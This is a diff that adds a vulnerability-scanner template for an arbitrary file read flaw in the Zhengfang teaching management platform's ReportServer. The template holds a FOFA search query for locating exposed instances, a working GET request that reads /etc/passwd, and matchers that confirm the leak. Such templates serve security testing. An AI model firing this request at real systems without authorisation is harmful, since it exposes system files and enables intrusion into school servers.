@@ -1,0 +1,26 @@
+## id: VEID-2024-0408
+## name: 正方教学管理信息服务平台ReportServer存在任意文件读取漏洞
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2024
+## description: 正方教学管理信息服务平台存在任意文件读取
+## fofa-query: body="正方软件股份有限公司" && title="教学管理信息服务平台"
+## verification: true
+
+
+GET /WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: text/plain
+
+
+#@ condition: and
+#@ matcher: header["Content-Type"] contains "javascript"
+#@ matcher: body matches /root:[^:]*:[0-9]+:[0-9]+:/
+#@ matcher: status_code == 200
+
+
+
+
+
+# @VEIL-STAMP: 8f9e901b7d4d263b983f759825bd7027ee1622dbdb93471cde1e5d2a5374b7bb
